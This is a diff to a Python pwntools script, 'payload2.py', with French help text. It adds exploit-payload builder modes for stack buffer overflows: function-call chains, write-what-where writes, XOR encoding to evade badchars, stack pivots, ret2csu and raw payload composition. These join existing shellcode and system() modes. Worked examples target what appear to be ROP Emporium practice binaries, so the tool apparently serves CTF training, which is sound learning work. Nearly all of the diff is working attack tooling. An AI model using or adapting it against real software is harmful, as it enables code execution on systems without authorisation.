@@ -310,6 +310,79 @@ def validate_no_nul_for_argv(payload: bytes, label: str) -> None:
         raise SystemExit(f"{label} contains NUL bytes and cannot be passed through argv")
 
 
+def parse_badchars(value: str | None) -> bytes:
+    if not value:
+        return b""
+
+    cleaned = value.replace(",", " ").replace(";", " ")
+    result = bytearray()
+    for part in cleaned.split():
+        result.append(parse_int(part))
+    return bytes(result)
+
+
+def data_from_args(args) -> bytes:
+    sources = [
+        args.data is not None,
+        args.data_hex is not None,
+        args.data_file is not None,
+    ]
+    if sum(sources) != 1:
+        raise SystemExit("provide exactly one of --data, --data-hex, or --data-file")
+
+    if args.data is not None:
+        data = args.data.encode()
+    elif args.data_hex is not None:
+        data = decode_hex_shellcode(args.data_hex.encode())
+    else:
+        data = Path(args.data_file).read_bytes()
+
+    if args.nul_terminate and not data.endswith(b"\x00"):
+        data += b"\x00"
+
+    if not data:
+        raise SystemExit("data is empty")
+
+    return data
+
+
+def check_badchars(data: bytes, badchars: bytes, label: str) -> None:
+    if not badchars:
+        return
+
+    found = sorted(set(data) & set(badchars))
+    if found:
+        rendered = ", ".join(f"0x{byte:02x}" for byte in found)
+        raise SystemExit(f"{label} contains badchars: {rendered}")
+
+
+def chunk_data(data: bytes, word_size: int, pad_byte: bytes) -> list[bytes]:
+    if word_size <= 0:
+        raise SystemExit("--word-size must be positive")
+    if word_size > context.bytes:
+        raise SystemExit(f"--word-size must be <= pointer size ({context.bytes})")
+
+    chunks = []
+    for index in range(0, len(data), word_size):
+        chunk = data[index : index + word_size]
+        if len(chunk) < word_size:
+            chunk = chunk.ljust(word_size, pad_byte)
+        chunks.append(chunk)
+    return chunks
+
+
+def pack_chain(addresses: list[int]) -> bytes:
+    return b"".join(p64(address) for address in addresses)
+
+
+def payload_from_chain(args, chain: list[int]) -> bytes:
+    offset = get_offset(args)
+    payload = (args.padding_byte * offset) + pack_chain(chain)
+    for index, address in enumerate(chain):
+        log.success("chain[%d] = %#x", index, address)
+    return payload
+
+
 def build_shellcode_body(args, offset: int, shellcode: bytes) -> bytes:
     nop_len = offset - len(shellcode) - args.post_shell_padding
     if nop_len < 0:
@@ -382,14 +455,7 @@ def build_jump_payload(args) -> bytes:
 
 
 def build_chain_payload(args) -> bytes:
-    offset = get_offset(args)
-    chain = b"".join(p64(address) for address in args.chain_addrs)
-    payload = (args.padding_byte * offset) + chain
-
-    for index, address in enumerate(args.chain_addrs):
-        log.success("chain[%d] = %#x", index, address)
-
-    return payload
+    return payload_from_chain(args, args.chain_addrs)
 
 
 def build_system_payload(args) -> bytes:
@@ -402,6 +468,198 @@ def build_system_payload(args) -> bytes:
     log.success("system argument string @ %#x", args.cmd_addr)
     log.success("system() @ %#x", args.system_addr)
     return build_chain_payload(args)
+
+
+def append_individual_register_args(args, chain: list[int]) -> None:
+    registers = [
+        ("rdi", args.pop_rdi, args.arg_rdi),
+        ("rsi", args.pop_rsi, args.arg_rsi),
+        ("rdx", args.pop_rdx, args.arg_rdx),
+        ("rcx", args.pop_rcx, args.arg_rcx),
+        ("r8", args.pop_r8, args.arg_r8),
+        ("r9", args.pop_r9, args.arg_r9),
+    ]
+
+    for register, gadget, value in registers:
+        if value is None:
+            continue
+        if gadget is None:
+            raise SystemExit(f"--arg-{register} requires --pop-{register}")
+        chain.extend([gadget, value])
+
+
+def append_function_call(args, chain: list[int], function_address: int) -> None:
+    if args.pop_rdi_rsi_rdx is not None:
+        missing = [
+            name
+            for name, value in (
+                ("--arg-rdi", args.arg_rdi),
+                ("--arg-rsi", args.arg_rsi),
+                ("--arg-rdx", args.arg_rdx),
+            )
+            if value is None
+        ]
+        if missing:
+            raise SystemExit(f"--pop-rdi-rsi-rdx requires {', '.join(missing)}")
+        chain.extend([args.pop_rdi_rsi_rdx, args.arg_rdi, args.arg_rsi, args.arg_rdx])
+    else:
+        append_individual_register_args(args, chain)
+
+    chain.append(function_address)
+
+
+def build_call_payload(args) -> bytes:
+    chain = []
+    if args.ret is not None:
+        chain.append(args.ret)
+
+    for function_address in args.funcs:
+        append_function_call(args, chain, function_address)
+
+    return payload_from_chain(args, chain)
+
+
+def add_write_chunks(args, chain: list[int], data: bytes) -> None:
+    chunks = chunk_data(data, args.word_size, args.pad_byte)
+    for index, chunk in enumerate(chunks):
+        destination = args.where + (index * args.word_size)
+        value = int.from_bytes(chunk, "little")
+
+        chain.append(args.pop_write)
+        if args.write_order == "dst-value":
+            chain.extend([destination, value])
+        else:
+            chain.extend([value, destination])
+        chain.append(args.write_gadget)
+
+        log.info("write[%d] %#x <- %r", index, destination, chunk)
+
+
+def add_optional_call_after_write(args, chain: list[int]) -> None:
+    if args.call_addr is None:
+        return
+    if args.pop_rdi is None:
+        raise SystemExit("--call-addr requires --pop-rdi")
+
+    call_arg = args.call_arg if args.call_arg is not None else args.where
+    if args.call_ret is not None:
+        chain.append(args.call_ret)
+    chain.extend([args.pop_rdi, call_arg, args.call_addr])
+    log.success("call target @ %#x with rdi=%#x", args.call_addr, call_arg)
+
+
+def build_write_payload(args) -> bytes:
+    data = data_from_args(args)
+    check_badchars(data, parse_badchars(args.badchars), "plain data")
+
+    chain = []
+    if args.ret is not None:
+        chain.append(args.ret)
+    add_write_chunks(args, chain, data)
+    add_optional_call_after_write(args, chain)
+    return payload_from_chain(args, chain)
+
+
+def encode_badchars(data: bytes, badchars: bytes, xor_key: int) -> bytes:
+    key = byte_from_int(xor_key)[0]
+    encoded = bytes(byte ^ key for byte in data)
+    check_badchars(encoded, badchars, "encoded data")
+    return encoded
+
+
+def add_xor_decoders(args, chain: list[int], length: int) -> None:
+    for index in range(length):
+        address = args.where + index
+        chain.append(args.pop_xor)
+        if args.xor_order == "key-addr":
+            chain.extend([args.xor_key, address])
+        else:
+            chain.extend([address, args.xor_key])
+        chain.append(args.xor_gadget)
+        log.info("decode byte[%d] @ %#x with xor %#x", index, address, args.xor_key)
+
+
+def build_badchars_payload(args) -> bytes:
+    plain = data_from_args(args)
+    badchars = parse_badchars(args.badchars)
+    encoded = encode_badchars(plain, badchars, args.xor_key)
+
+    chain = []
+    if args.ret is not None:
+        chain.append(args.ret)
+    add_write_chunks(args, chain, encoded)
+    add_xor_decoders(args, chain, len(plain))
+    add_optional_call_after_write(args, chain)
+    return payload_from_chain(args, chain)
+
+
+def build_pivot_payload(args) -> bytes:
+    chain = []
+    if args.pop_rsp is not None:
+        chain.extend([args.pop_rsp, args.pivot_addr])
+    else:
+        if args.pop_rax is None or args.xchg_rax_rsp is None:
+            raise SystemExit("pivot requires either --pop-rsp, or both --pop-rax and --xchg-rax-rsp")
+        chain.extend([args.pop_rax, args.pivot_addr, args.xchg_rax_rsp])
+    return payload_from_chain(args, chain)
+
+
+def build_ret2csu_payload(args) -> bytes:
+    chain = []
+    if args.ret is not None:
+        chain.append(args.ret)
+
+    chain.extend(
+        [
+            args.csu_pop,
+            0,
+            1,
+            args.call_ptr,
+            args.arg_rdi,
+            args.arg_rsi,
+            args.arg_rdx,
+            args.csu_call,
+            args.stack_pad,
+            args.junk,
+            args.junk,
+            args.junk,
+            args.junk,
+            args.junk,
+            args.junk,
+        ]
+    )
+
+    if args.next_addr is not None:
+        chain.append(args.next_addr)
+
+    return payload_from_chain(args, chain)
+
+
+def parse_compose_part(part: str) -> bytes:
+    kind, separator, value = part.partition(":")
+    if not separator:
+        raise argparse.ArgumentTypeError("parts must look like addr:0x401000, u64:1, hex:4141, or str:text")
+
+    if kind == "addr" or kind == "u64":
+        return p64(parse_int(value))
+    if kind == "u32":
+        return p32(parse_int(value))
+    if kind == "byte":
+        return parse_byte(value)
+    if kind == "hex":
+        return decode_hex_shellcode(value.encode())
+    if kind == "str":
+        return value.encode()
+    if kind == "file":
+        return Path(value).read_bytes()
+
+    raise argparse.ArgumentTypeError(f"unsupported part kind: {kind}")
+
+
+def build_compose_payload(args) -> bytes:
+    offset = get_offset(args)
+    body = b"".join(parse_compose_part(part) for part in args.parts)
+    return (args.padding_byte * offset) + body
 
 
 def write_payload(path: Path, payload: bytes) -> None:
@@ -423,12 +681,24 @@ Modes:
   jump       Ecrase l'adresse de retour avec une seule adresse.
   chain      Construit une chaine ROP brute avec plusieurs adresses.
   system     Appelle system(cmd_addr) avec un gadget pop rdi ; ret.
+  call       Appelle une ou plusieurs fonctions avec des arguments en registres.
+  write      Ecrit une chaine en memoire avec des gadgets write-what-where.
+  badchars   Ecrit une chaine encodee puis la decode en memoire.
+  pivot      Construit une petite payload de pivot de stack.
+  ret2csu    Utilise les gadgets __libc_csu_init pour rdi/rsi/rdx.
+  compose    Assemble des morceaux bruts dans l'ordre exact donne.
 
 Aide detaillee par mode:
   python3 payload2.py shellcode -h
   python3 payload2.py jump -h
   python3 payload2.py chain -h
   python3 payload2.py system -h
+  python3 payload2.py call -h
+  python3 payload2.py write -h
+  python3 payload2.py badchars -h
+  python3 payload2.py pivot -h
+  python3 payload2.py ret2csu -h
+  python3 payload2.py compose -h
 
 Exemples:
   # ret2win, entree stdin, offset automatique
@@ -496,7 +766,11 @@ Exemples:
     parser.add_argument("--no-hexdump", action="store_true", help="n'affiche pas l'hexdump du payload final")
     parser.add_argument("--checksec", action="store_true", help="affiche les protections du binaire via pwntools")
 
-    subparsers = parser.add_subparsers(dest="mode", required=True, metavar="{shellcode,jump,chain,system}")
+    subparsers = parser.add_subparsers(
+        dest="mode",
+        required=True,
+        metavar="{shellcode,jump,chain,system,call,write,badchars,pivot,ret2csu,compose}",
+    )
 
     shellcode_parser = subparsers.add_parser(
         "shellcode",
@@ -590,6 +864,220 @@ Trouver les adresses:
     system_parser.add_argument("--system-addr", type=parse_int, required=True, help="adresse de system@plt ou system")
     system_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel pour realigner la stack")
     system_parser.set_defaults(builder=build_system_payload)
+
+    call_parser = subparsers.add_parser(
+        "call",
+        help="appelle une ou plusieurs fonctions avec des arguments",
+        description=(
+            "Construit une chaine ROP pour appeler une ou plusieurs fonctions. "
+            "Utile pour callme et pour les fonctions qui prennent rdi/rsi/rdx."
+        ),
+        epilog="""
+Exemple callme:
+  python3 payload2.py --run --input stdin --target ./callme call \\
+    --pop-rdi-rsi-rdx 0x40093c \\
+    --arg-rdi 1 --arg-rsi 2 --arg-rdx 3 \\
+    --func 0x400720 --func 0x400740 --func 0x4006f0
+
+Exemple avec gadgets separes:
+  python3 payload2.py --run --input stdin --target ./bin call \\
+    --pop-rdi 0x401123 --arg-rdi 0xdeadbeef \\
+    --pop-rsi 0x401125 --arg-rsi 2 \\
+    --func 0x401050
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    call_parser.add_argument("--func", dest="funcs", type=parse_int, action="append", required=True, help="fonction a appeler; repeter pour plusieurs appels")
+    call_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
+    call_parser.add_argument("--pop-rdi-rsi-rdx", type=parse_int, help="gadget pop rdi ; pop rsi ; pop rdx ; ret")
+    call_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret")
+    call_parser.add_argument("--pop-rsi", type=parse_int, help="gadget pop rsi ; ret")
+    call_parser.add_argument("--pop-rdx", type=parse_int, help="gadget pop rdx ; ret")
+    call_parser.add_argument("--pop-rcx", type=parse_int, help="gadget pop rcx ; ret")
+    call_parser.add_argument("--pop-r8", type=parse_int, help="gadget pop r8 ; ret")
+    call_parser.add_argument("--pop-r9", type=parse_int, help="gadget pop r9 ; ret")
+    call_parser.add_argument("--arg-rdi", type=parse_int, help="valeur du 1er argument")
+    call_parser.add_argument("--arg-rsi", type=parse_int, help="valeur du 2e argument")
+    call_parser.add_argument("--arg-rdx", type=parse_int, help="valeur du 3e argument")
+    call_parser.add_argument("--arg-rcx", type=parse_int, help="valeur du 4e argument")
+    call_parser.add_argument("--arg-r8", type=parse_int, help="valeur du 5e argument")
+    call_parser.add_argument("--arg-r9", type=parse_int, help="valeur du 6e argument")
+    call_parser.set_defaults(builder=build_call_payload)
+
+    write_parser = subparsers.add_parser(
+        "write",
+        help="ecrit une chaine en memoire avec des gadgets",
+        description=(
+            "Construit une chaine write-what-where: un gadget pop charge l'adresse et la valeur, "
+            "puis un gadget mov ecrit la valeur en memoire. Utile pour write4."
+        ),
+        epilog="""
+Exemple write4:
+  python3 payload2.py --run --input stdin --target ./write4 write \\
+    --where 0x601028 \\
+    --data "flag.txt" --nul-terminate \\
+    --pop-write 0x400690 \\
+    --write-gadget 0x400628 \\
+    --write-order dst-value \\
+    --pop-rdi 0x400693 \\
+    --call-addr 0x400510
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    write_parser.add_argument("--where", type=parse_int, required=True, help="adresse memoire ou ecrire les donnees")
+    write_parser.add_argument("--data", help="donnees ASCII a ecrire")
+    write_parser.add_argument("--data-hex", help="donnees hex a ecrire, ex: 666c61672e747874")
+    write_parser.add_argument("--data-file", help="fichier dont le contenu doit etre ecrit")
+    write_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent")
+    write_parser.add_argument("--badchars", help="octets interdits a refuser dans la donnee, ex: '0x00 0x0a'")
+    write_parser.add_argument("--word-size", type=parse_int, default=8, help="taille d'un mot ecrit par gadget (defaut: 8)")
+    write_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet de padding du dernier mot")
+    write_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut")
+    write_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop pour preparer destination et valeur")
+    write_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget qui ecrit la valeur en memoire")
+    write_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des pops du gadget d'ecriture")
+    write_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour appeler une fonction ensuite")
+    write_parser.add_argument("--call-addr", type=parse_int, help="fonction a appeler apres l'ecriture, ex: print_file@plt")
+    write_parser.add_argument("--call-arg", type=parse_int, help="argument rdi de l'appel final; defaut: --where")
+    write_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel avant l'appel final")
+    write_parser.set_defaults(builder=build_write_payload)
+
+    badchars_parser = subparsers.add_parser(
+        "badchars",
+        help="ecrit une chaine encodee puis la decode",
+        description=(
+            "Encode les donnees avec XOR pour eviter des badchars, ecrit les octets encodes, "
+            "puis ajoute des gadgets XOR byte ptr [...] pour les decoder en memoire."
+        ),
+        epilog="""
+Exemple badchars:
+  python3 payload2.py --run --input stdin --target ./badchars badchars \\
+    --where 0x601038 \\
+    --data "flag.txt" --nul-terminate \\
+    --badchars "0x78 0x67 0x61 0x2e" \\
+    --xor-key 2 \\
+    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst \\
+    --pop-xor 0x4006a0 --xor-gadget 0x400628 --xor-order key-addr \\
+    --pop-rdi 0x4006a3 --call-addr 0x400510
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    badchars_parser.add_argument("--where", type=parse_int, required=True, help="adresse memoire ou ecrire les donnees encodees")
+    badchars_parser.add_argument("--data", help="donnees ASCII a encoder/ecrire")
+    badchars_parser.add_argument("--data-hex", help="donnees hex a encoder/ecrire")
+    badchars_parser.add_argument("--data-file", help="fichier dont le contenu doit etre encode/ecrit")
+    badchars_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent")
+    badchars_parser.add_argument("--badchars", required=True, help="octets interdits, ex: '0x78 0x67 0x61 0x2e'")
+    badchars_parser.add_argument("--xor-key", type=parse_int, required=True, help="cle XOR 1 octet utilisee pour encoder/decoder")
+    badchars_parser.add_argument("--word-size", type=parse_int, default=8, help="taille d'un mot ecrit par gadget (defaut: 8)")
+    badchars_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet de padding du dernier mot")
+    badchars_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut")
+    badchars_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop pour preparer destination et valeur")
+    badchars_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget qui ecrit la valeur encodee en memoire")
+    badchars_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des pops du gadget d'ecriture")
+    badchars_parser.add_argument("--pop-xor", type=parse_int, required=True, help="gadget pop pour preparer la cle XOR et l'adresse")
+    badchars_parser.add_argument("--xor-gadget", type=parse_int, required=True, help="gadget XOR byte ptr [addr], key")
+    badchars_parser.add_argument("--xor-order", choices=("key-addr", "addr-key"), default="key-addr", help="ordre des pops du gadget de decodage")
+    badchars_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour appeler une fonction ensuite")
+    badchars_parser.add_argument("--call-addr", type=parse_int, help="fonction a appeler apres decodage, ex: print_file@plt")
+    badchars_parser.add_argument("--call-arg", type=parse_int, help="argument rdi de l'appel final; defaut: --where")
+    badchars_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel avant l'appel final")
+    badchars_parser.set_defaults(builder=build_badchars_payload)
+
+    pivot_parser = subparsers.add_parser(
+        "pivot",
+        help="construit une payload de pivot de stack",
+        description="Construit la petite payload qui remplace RSP par une adresse controlee.",
+        epilog="""
+Exemple pivot classique:
+  python3 payload2.py --input stdin --target ./pivot pivot \\
+    --pivot-addr 0x7ffff7ffbf10 \\
+    --pop-rax 0x4009bb \\
+    --xchg-rax-rsp 0x4009bd
+
+Si tu as directement pop rsp ; ret:
+  python3 payload2.py --input stdin --target ./pivot pivot \\
+    --pivot-addr 0x7ffff7ffbf10 \\
+    --pop-rsp 0x400a2d
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    pivot_parser.add_argument("--pivot-addr", type=parse_int, required=True, help="nouvelle adresse de stack")
+    pivot_parser.add_argument("--pop-rsp", type=parse_int, help="gadget pop rsp ; ret")
+    pivot_parser.add_argument("--pop-rax", type=parse_int, help="gadget pop rax ; ret")
+    pivot_parser.add_argument("--xchg-rax-rsp", type=parse_int, help="gadget xchg rax, rsp ; ret")
+    pivot_parser.set_defaults(builder=build_pivot_payload)
+
+    ret2csu_parser = subparsers.add_parser(
+        "ret2csu",
+        help="utilise les gadgets __libc_csu_init",
+        description=(
+            "Construit la sequence ret2csu classique: gadget pop rbx/rbp/r12/r13/r14/r15, "
+            "puis gadget qui fait rdx=r15, rsi=r14, edi=r13d et call [r12+rbx*8]."
+        ),
+        epilog="""
+Schema genere:
+  csu_pop
+  rbx=0
+  rbp=1
+  r12=call_ptr
+  r13=arg_rdi
+  r14=arg_rsi
+  r15=arg_rdx
+  csu_call
+  stack_pad
+  junk x6
+  next_addr optionnel
+
+Exemple:
+  python3 payload2.py --run --input stdin --target ./ret2csu ret2csu \\
+    --csu-pop 0x40089a \\
+    --csu-call 0x400880 \\
+    --call-ptr 0x600e48 \\
+    --arg-rdi 0xdeadbeefdeadbeef \\
+    --arg-rsi 0xcafebabecafebabe \\
+    --arg-rdx 0xd00df00dd00df00d \\
+    --next-addr 0x4007b1
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    ret2csu_parser.add_argument("--csu-pop", type=parse_int, required=True, help="gadget pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret")
+    ret2csu_parser.add_argument("--csu-call", type=parse_int, required=True, help="gadget mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]")
+    ret2csu_parser.add_argument("--call-ptr", type=parse_int, required=True, help="adresse pointee par r12; doit contenir un pointeur de fonction appelable")
+    ret2csu_parser.add_argument("--arg-rdi", type=parse_int, required=True, help="valeur placee dans rdi/edi")
+    ret2csu_parser.add_argument("--arg-rsi", type=parse_int, required=True, help="valeur placee dans rsi")
+    ret2csu_parser.add_argument("--arg-rdx", type=parse_int, required=True, help="valeur placee dans rdx")
+    ret2csu_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel avant la sequence")
+    ret2csu_parser.add_argument("--stack-pad", type=parse_int, default=0x4141414141414141, help="padding consomme par add rsp, 8")
+    ret2csu_parser.add_argument("--junk", type=parse_int, default=0x4242424242424242, help="valeur junk pour les six pops apres csu_call")
+    ret2csu_parser.add_argument("--next-addr", type=parse_int, help="adresse a executer apres la sequence ret2csu")
+    ret2csu_parser.set_defaults(builder=build_ret2csu_payload)
+
+    compose_parser = subparsers.add_parser(
+        "compose",
+        help="assemble des morceaux bruts dans l'ordre exact",
+        description="Construit padding + une suite de morceaux. Utile pour les chains tres specifiques comme fluff.",
+        epilog="""
+Types de morceaux:
+  addr:0x401000     packe une adresse en 64 bits little-endian
+  u64:0x1234        packe un entier 64 bits
+  u32:0x1234        packe un entier 32 bits
+  byte:0x41         ajoute un octet
+  hex:414243        ajoute des octets depuis hex
+  str:ABC           ajoute du texte ASCII/UTF-8
+  file:stage2.bin   ajoute le contenu d'un fichier
+
+Exemple:
+  python3 payload2.py --offset 40 compose \\
+    --part addr:0x400741 \\
+    --part addr:0x4007c3 \\
+    --part addr:0x601060 \\
+    --part addr:0x400560
+""",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    compose_parser.add_argument("--part", dest="parts", action="append", required=True, help="morceau a ajouter, ex: addr:0x401000 ou hex:4141")
+    compose_parser.set_defaults(builder=build_compose_payload)
 
     return parser
 
